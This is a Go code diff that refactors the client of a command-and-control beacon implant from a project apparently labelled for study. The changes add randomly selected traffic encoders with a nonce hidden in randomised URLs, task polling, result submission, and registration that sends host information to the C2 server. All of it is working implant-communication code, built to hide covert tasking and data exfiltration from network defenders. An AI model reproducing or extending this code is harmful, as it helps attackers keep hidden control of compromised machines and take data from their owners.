@@ -2,7 +2,6 @@ package client
 
 import (
 	"bytes"
-	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -15,25 +14,34 @@ import (
 	beaconProtocol "xhc2_for_studying/protocol/beacon"
 )
 
-// sendEncrypted 加密原文 → Base64 编码 → 构造随机 URL（嵌入 nonce）→ POST → 解码解密响应。
-func (c *Client) sendEncrypted(jsonBody []byte, ext string) ([]byte, error) {
-	encodedBody, nonceB64, err := c.encryptAndEncode(jsonBody)
-	if err != nil {
-		return nil, fmt.Errorf("encrypt: %w", err)
+// sendEncrypted encrypts the plaintext, encodes it with a random encoder,
+// builds a random URL embedding the encoder negotiation nonce, sends the
+// request, and decodes and decrypts the response.
+func (c *Client) sendEncrypted(method string, jsonBody []byte, ext string) ([]byte, error) {
+	var encodedBody []byte
+	var encoderNonce int
+	var err error
+	if jsonBody != nil {
+		encodedBody, encoderNonce, err = c.encryptAndEncode(jsonBody)
+		if err != nil {
+			return nil, fmt.Errorf("encrypt: %w", err)
+		}
+	} else {
+		enc := protocol.RandomEncoder()
+		encoderNonce = protocol.GenerateNonce(enc.ID(), c.c2Profile.EncoderModulus)
 	}
 
-	reqURL, err := buildRandomURL(c.baseURL, c.c2Profile, ext)
+	reqURL, err := buildRandomURL(c.baseURL, c.pathPrefix, c.c2Profile, ext)
 	if err != nil {
 		return nil, fmt.Errorf("build url: %w", err)
 	}
-	embedEncryptionNonce(reqURL, nonceB64)
+	embedEncoderNonce(reqURL, encoderNonce)
 
-	httpReq, err := http.NewRequest(http.MethodPost, reqURL.String(), bytes.NewReader(encodedBody))
+	httpReq, err := http.NewRequest(method, reqURL.String(), bytes.NewReader(encodedBody))
 	if err != nil {
 		return nil, err
 	}
-	httpReq.Header.Set("Content-Type", "application/octet-stream")
-	httpReq.Header.Set("X-Session-Token", c.sessionToken)
+	c.applyRequestHeaders(httpReq, jsonBody != nil)
 
 	resp, err := c.httpClient.Do(httpReq)
 	if err != nil {
@@ -50,14 +58,21 @@ func (c *Client) sendEncrypted(jsonBody []byte, ext string) ([]byte, error) {
 		return nil, fmt.Errorf("request failed with status %d: %s", resp.StatusCode, string(rawBody))
 	}
 
-	// Base64 解码 → 解密
-	decoded, err := base64.StdEncoding.DecodeString(string(rawBody))
+	// Decode the response with the same encoder, then decrypt.
+	encoderID := protocol.ExtractEncoderID(encoderNonce, c.c2Profile.EncoderModulus)
+	enc, ok := protocol.GetEncoderByID(encoderID)
+	if !ok {
+		return nil, fmt.Errorf("unknown encoder id %d", encoderID)
+	}
+	decoded, err := enc.Decode(rawBody)
 	if err != nil {
 		return nil, fmt.Errorf("decode response: %w", err)
 	}
 	return c.cipherCtx.Decrypt(decoded)
 }
 
+// Register sends a registration request to the C2 server with the host
+// information and beacon configuration. It returns the assigned beacon ID.
 func (c *Client) Register(hostInfo *identity.HostInfo, cfg *config.BeaconConfig) (string, error) {
 	if c == nil {
 		return "", errors.New("client is nil")
@@ -80,7 +95,7 @@ func (c *Client) Register(hostInfo *identity.HostInfo, cfg *config.BeaconConfig)
 		return "", err
 	}
 
-	decodedBody, err := c.sendEncrypted(jsonReq, protocol.ExtRegister)
+	decodedBody, err := c.sendEncrypted(http.MethodPost, jsonReq, c.extMap.Register)
 	if err != nil {
 		return "", err
 	}
@@ -96,7 +111,9 @@ func (c *Client) Register(hostInfo *identity.HostInfo, cfg *config.BeaconConfig)
 	return registerResp.BeaconID, nil
 }
 
-func (c *Client) CheckIn(beaconID string, taskResult *protocol.TaskResult) (*beaconProtocol.CheckinResponse, error) {
+// Poll sends a periodic poll request to the C2 server and returns any tasks
+// assigned by the server.
+func (c *Client) Poll(beaconID string) (*beaconProtocol.PollResponse, error) {
 	if c == nil {
 		return nil, errors.New("client is nil")
 	}
@@ -104,28 +121,54 @@ func (c *Client) CheckIn(beaconID string, taskResult *protocol.TaskResult) (*bea
 		return nil, errors.New("cipher context not initialized")
 	}
 
-	reqTaskResult := protocol.TaskResult{}
-	if taskResult != nil {
-		reqTaskResult = *taskResult
+	if beaconID == "" {
+		return nil, errors.New("beacon id is empty")
 	}
 
-	req := &beaconProtocol.CheckinRequest{
+	decodedBody, err := c.sendEncrypted(http.MethodGet, nil, c.extMap.Poll)
+	if err != nil {
+		return nil, err
+	}
+
+	var pollResp beaconProtocol.PollResponse
+	if err := json.Unmarshal(decodedBody, &pollResp); err != nil {
+		return nil, err
+	}
+	return &pollResp, nil
+}
+
+// SubmitResult reports a completed task result to the C2 server.
+func (c *Client) SubmitResult(beaconID string, taskResult *protocol.TaskResult) error {
+	if c == nil {
+		return errors.New("client is nil")
+	}
+	if c.cipherCtx == nil {
+		return errors.New("cipher context not initialized")
+	}
+	if taskResult == nil {
+		return errors.New("task result is nil")
+	}
+
+	req := &beaconProtocol.ResultRequest{
 		BeaconID:   beaconID,
-		TaskResult: reqTaskResult,
+		TaskResult: *taskResult,
 	}
 	jsonReq, err := json.Marshal(req)
 	if err != nil {
-		return nil, err
+		return err
 	}
 
-	decodedBody, err := c.sendEncrypted(jsonReq, protocol.ExtCheckin)
+	decodedBody, err := c.sendEncrypted(http.MethodPost, jsonReq, c.extMap.Result)
 	if err != nil {
-		return nil, err
+		return err
 	}
 
-	var checkinResp beaconProtocol.CheckinResponse
-	if err := json.Unmarshal(decodedBody, &checkinResp); err != nil {
-		return nil, err
+	var resultResp beaconProtocol.ResultResponse
+	if err := json.Unmarshal(decodedBody, &resultResp); err != nil {
+		return err
 	}
-	return &checkinResp, nil
+	if !resultResp.OK {
+		return errors.New("result was not acknowledged")
+	}
+	return nil
 }
